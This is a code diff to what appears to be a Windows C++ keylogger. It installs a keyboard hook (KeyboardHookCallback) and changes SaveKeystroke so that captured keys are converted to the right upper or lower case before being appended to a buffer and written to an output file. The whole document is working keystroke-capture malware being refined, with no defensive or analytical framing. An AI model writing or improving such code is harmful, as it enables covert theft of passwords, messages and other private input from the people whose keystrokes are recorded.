@@ -46,20 +46,29 @@ int SaveKeystroke(int keyStroke) {
 	}
 
 	char key;
-	bool isLowercase = true;
 	HWND foregroundWindow = GetForegroundWindow();
 	HKL layout = 0x00;
 	DWORD threadId = GetWindowThreadProcessId(foregroundWindow, 0x00);
 	layout = GetKeyboardLayout(threadId);
 
+	bool isUppercase = false;
+	// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
 	// check capslock
-	isLowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-	// check shift
-	isLowercase = (GetKeyState(VK_SHIFT) & 0x1000) != 0 
+	isUppercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check if toggled
+	// check shift - all below check if key is down
+	isUppercase = isUppercase 
+		? isUppercase 
+		: (GetKeyState(VK_SHIFT) & 0x1000) != 0
 		|| (GetKeyState(VK_LSHIFT) & 0x1000) != 0
 		|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0;
 
 	key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);
+	
+	// Handles unicode by default
+	if (!isUppercase) {
+		key = tolower(key);
+	}
+
 	writeFileBuf += key;
 	
 	WriteBufferToOutFile(writeFileBuf);
@@ -80,7 +89,6 @@ LRESULT __stdcall KeyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
 	}
 
 	// pass exec to next hook
-	// 
 	return CallNextHookEx(_kbHook, nCode, wParam, lParam);
 }
 
